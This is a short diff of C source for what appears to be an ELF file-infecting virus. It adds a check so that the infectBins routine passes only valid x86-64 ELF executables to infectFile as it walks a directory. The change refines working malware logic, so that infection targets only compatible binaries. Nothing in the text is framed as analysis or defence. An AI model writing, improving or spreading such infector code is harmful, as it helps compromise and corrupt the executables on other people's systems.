@@ -290,6 +290,14 @@ static void  infectFile(struct bfile bin) {
   munmap(bin.header, bin.size);
 }
 
+static int  isCompatible(unsigned char e_ident[EI_NIDENT], Elf64_Half e_machine) {
+  return (e_ident[EI_MAG0] == ELFMAG0 &&
+          e_ident[EI_MAG1] == ELFMAG1 &&
+          e_ident[EI_MAG2] == ELFMAG2 &&
+          e_ident[EI_MAG3] == ELFMAG3 &&
+          e_machine == EM_X86_64);
+}
+
 static int  infectBins(const char *dirname) {
   int                   fd;
   int                   ret;
@@ -309,7 +317,9 @@ static int  infectBins(const char *dirname) {
     dirp = (struct linux_dirent *) (buf + bpos);
     if ((ret = mapFile(dirname, dirp->d_name, &bin)) == -1)
       return (-1);
-    if (ret == 0)
+    if (ret == 0 &&
+      bin.size >= sizeof(Elf64_Ehdr) &&
+      isCompatible(bin.header->e_ident, bin.header->e_machine))
       infectFile(bin);
     bpos += dirp->d_reclen;
   }
